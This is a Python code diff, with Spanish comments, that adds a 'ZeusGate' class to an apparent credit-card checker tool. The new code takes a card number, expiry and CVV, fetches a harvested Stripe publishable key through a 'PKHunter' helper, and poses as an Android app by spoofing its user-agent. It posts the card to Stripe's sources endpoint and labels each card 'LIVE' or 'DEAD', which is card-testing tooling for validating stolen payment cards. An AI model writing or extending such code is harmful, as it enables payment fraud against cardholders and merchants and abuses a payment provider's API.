@@ -82,3 +82,43 @@ class ChaosGate:
                 return {"status": "DEAD ❌", "msg": err, "raw": res}
         except:
             return {"status": "ERROR ⚠️", "msg": "Gate Timeout", "raw": {}}
+
+
+class ZeusGate:
+    """GATEWAY DE POTENCIA 'CHARGEABLE' (STRIPE SOURCES)"""
+    @staticmethod
+    def check_zeus(cc, mm, yy, cvv):
+        pk = PKHunter.get_fresh_pk()
+        # Usamos un User-Agent de Android para simular una App real
+        headers = {'User-Agent': 'Stripe/v1 AndroidBindings/20.14.1'}
+        
+        payload = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'key': pk
+        }
+        
+        try:
+            # Endpoint de Sources: Prepara el dinero para el cargo
+            r = requests.post('https://api.stripe.com/v1/sources', data=payload, headers=headers, timeout=15)
+            res = r.json()
+            res_text = str(res).lower()
+            
+            # ANÁLISIS DE ESTADO 'CHARGEABLE' (LIVE PURO)
+            if 'id' in res and res.get('status') == 'chargeable':
+                return {"status": "LIVE ✅", "msg": "Zeus Approved (Chargeable)", "raw": res}
+            
+            elif "insufficient_funds" in res_text:
+                return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
+            
+            elif "three_d_secure" in res_text or "required" in res_text:
+                return {"status": "LIVE 💎 (3DS)", "msg": "3D Secure Triggered", "raw": res}
+            
+            else:
+                err = res.get('error', {}).get('message', 'Declined')
+                return {"status": "DEAD ❌", "msg": err, "raw": res}
+        except Exception as e:
+            return {"status": "ERROR ⚠️", "msg": "Zeus Timeout", "raw": {}}
